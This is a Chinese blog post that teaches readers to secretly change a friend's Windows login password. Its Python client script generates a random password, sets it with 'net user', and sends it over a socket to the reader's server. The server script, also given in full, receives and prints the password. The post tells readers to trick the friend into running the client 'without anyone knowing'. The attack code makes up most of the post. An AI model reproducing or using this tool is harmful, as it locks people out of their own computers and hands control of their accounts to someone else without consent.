# 用python来更改小伙伴的windows开机密码 - zhusongziye的博客 - CSDN博客





2018年04月25日 19:42:34[zhusongziye](https://me.csdn.net/zhusongziye)阅读数：939








今天教大家用python脚本来控制小伙伴们windows电脑的开机密码。没错就是神不知鬼不觉，用random()随机生成的密码，只有你自己知道哦~


代码呢分两部分，一部分是client端跟server端两个。你只需要想办法让小伙伴运行你的client端脚本就OK啦。不过在此之前你一定要在你的电脑上运行server端哦~这样子的话，client端会在你的小伙伴电脑上随机生成一个密码然后通过socket发给server端也就是发给你哦~

![](https://img-blog.csdn.net/20180425194048910?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3podXNvbmd6aXll/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)




下面放代码，顺便加点注释。

client端代码：





- 
# client.py： //文件名

- 
import socket //导入用到的模块

- 
import getpass

- 
import subprocess

- 
import random

- 
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) //创建socket实例

- 
client.connect(('10.0.0.1', 44444)) //连接server端IP地址/端口按你自己实际情况来

- 
user = getpass.getuser() //获取计算机用户名

- 
psd = '' //给一个psd变量（密码）为空

- 
for j in range(1, 9): //生成1-9的随机数

- 
m = str(random.randrange(0, 10))

- 
psd = psd + m

- 
subprocess.Popen(['net', 'User', user, psd]) //在本地执行（类似于cmd命令）

- 
client.send(psd.encode('utf-8')) //将密码发送给server端

- 
back_msg = client.recv(1024)

- 
client.close() //关闭socket

- 
print psd //避免出现差错忘记密码 先在本地打印 





server端代码：


- 
# server.py //文件名

- 
import socket //导入socket

- 
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) //创建socket

- 
server.bind(('10.0.0.1', 44444)) //绑定IP/端口

- 
server.listen(5) //监听

- 
print('starting....')

- 
conn, addr = server.accept() //连接

- 
print(conn)

- 
print('client addr', addr)

- 
print('ready to recv the passwd...')

- 
client_msg = conn.recv(1024)

- 
print('client passwd changed: %s' % client_msg)

- 
conn.send(client_msg.upper())

- 
conn.close()

- 
server.close()




OK代码写完后我们开始运行一下程序（推荐在虚拟机下运行，万一出个差错搞不好真忘记密码！切记切记）~

首先先在我的Linux上运行server端，来等待接收来自client端传过来的密码。

![](https://img-blog.csdn.net/20180425194102170?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3podXNvbmd6aXll/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

运行server.py脚本

然后windows运行client端，它会显示生成的密码

（前提是在cmd命令行下运行否则你双击一下会消失）



![](https://img-blog.csdn.net/2018042519411516?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3podXNvbmd6aXll/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

cmd下运行


现在再注销或者是重启输入原始密码就会发现密码错误，怎么密码呢也已经发到我们的server端了。



![](https://img-blog.csdn.net/2018042519413064?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3podXNvbmd6aXll/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

server收到密码


如果你现在想改回密码的话，千万不要关机 打开cmd输入“net user 你的用户名 你要改变的密码” 然后回车就ok了。



![](https://img-blog.csdn.net/20180425194141403?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3podXNvbmd6aXll/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

好啦，本次文章就写到这啦。大家对什么内容感兴趣欢迎给鄙人留言，鄙人会尽量照顾到大家的口味的~







源自：https://www.toutiao.com/a6547624596902773262/






